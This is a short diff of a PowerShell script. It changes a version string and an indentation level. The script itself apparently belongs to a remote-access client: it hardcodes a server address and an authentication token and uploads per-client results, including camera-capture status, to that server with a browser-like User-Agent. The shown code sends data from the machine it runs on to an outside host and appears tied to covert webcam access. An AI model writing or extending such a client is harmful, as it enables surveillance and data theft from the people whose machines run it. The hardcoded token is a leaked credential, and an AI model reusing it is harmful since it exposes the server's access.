@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.3"
+$Version = "3.1.4"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -503,7 +503,7 @@ try {
             try {
                 $wc = New-Object System.Net.WebClient
                 $wc.Headers.Add('User-Agent','Mozilla/5.0')
-$wc.Headers.Add('X-Token', $cfToken)
+                $wc.Headers.Add('X-Token', $cfToken)
                 $wc.UploadData("$cfHost/result?id=$clientId", 'POST',
                     [System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: $($_.Exception.Message)`n")) | Out-Null
                 $wc.Dispose()
